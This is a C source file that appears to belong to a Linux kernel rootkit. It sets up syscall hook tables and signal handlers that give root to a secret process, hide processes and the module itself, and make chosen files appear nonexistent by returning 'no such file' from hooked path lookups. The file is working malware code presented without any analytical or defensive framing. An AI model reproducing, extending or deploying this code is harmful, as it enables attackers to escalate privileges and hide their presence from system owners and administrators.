#include "syscall_hooks.h"

#include "constants.h"
#include "files.h"
#include "hooking.h"
#include "macro_utils.h"
#include <linux/err.h>
#include <linux/fcntl.h>
#include <linux/fdtable.h>
#include <linux/gfp.h>
#include <linux/limits.h>
#include <linux/namei.h>
#include <linux/printk.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// Initialize original syscall functions array
sysfun_t P_ORIG_SYSFUNS[__NR_syscalls] = { NULL };

// Initialize syscall hooks array
hook_t P_SYSCALL_HOOKS[] = SYSCALL_HOOKS(HOOKED_SYSCALLS);

// Initialize signal handlers array
const signal_handler_t P_SIG_HANDLERS[] = {
    NEW_SIGNAL_HANDLER(PID_SECRET, SIGROOT, give_root),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGHIDE, show_hide_process),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGSHOW, show_hide_process),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGAUTH, authorize_process),
    NEW_SIGNAL_HANDLER(PID_SECRET, SIGMODHIDE, sig_hide_module),
    NEW_SIGNAL_HANDLER(PID_SECRET, SIGMODSHOW, sig_show_module),
    NEW_SIGNAL_HANDLER(0, 0, NULL), // The last element must have a NULL `sig_handler`
};

long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs, const int i32_dfd,
                     const char __user *const s_filename, const int i32_at_flags)
{
    long i64_ret                   = 0;    // Return value of the real syscall
    unsigned int ui32_lookup_flags = 0;    // Lookup flags used when parsing path
    const char *s_filename_k       = NULL; // Kernel buffer for file name

    s_filename_k = strndup_user(s_filename, PATH_MAX);

    IF_U (IS_ERR_OR_NULL(s_filename_k)) {
        pr_dev_err("* Could not copy filename from user\n");
        s_filename_k = kstrdup_const("(unknown)", GFP_KERNEL);
    }

    pr_dev_info("* File name: %s\n", s_filename_k);

    kfree_const(s_filename_k);

    if (!(i32_at_flags & AT_SYMLINK_NOFOLLOW)) {
        ui32_lookup_flags |= LOOKUP_FOLLOW;
    }

    if (i32_at_flags & AT_EMPTY_PATH) {
        ui32_lookup_flags |= LOOKUP_EMPTY;
    }

    IF_U (i32_at_flags & AT_LOOKUP_CREATE) {
        ui32_lookup_flags |= LOOKUP_CREATE;
    }

    IF_U (is_pathname_hidden(i32_dfd, s_filename, ui32_lookup_flags)) {
        pr_dev_info("    * Hiding file\n");

        return -ENOENT; // No such file or directory
    }

    i64_ret = orig_func(p_regs);
    pr_dev_info("* Return value: %ld\n", i64_ret);

    return i64_ret;
}
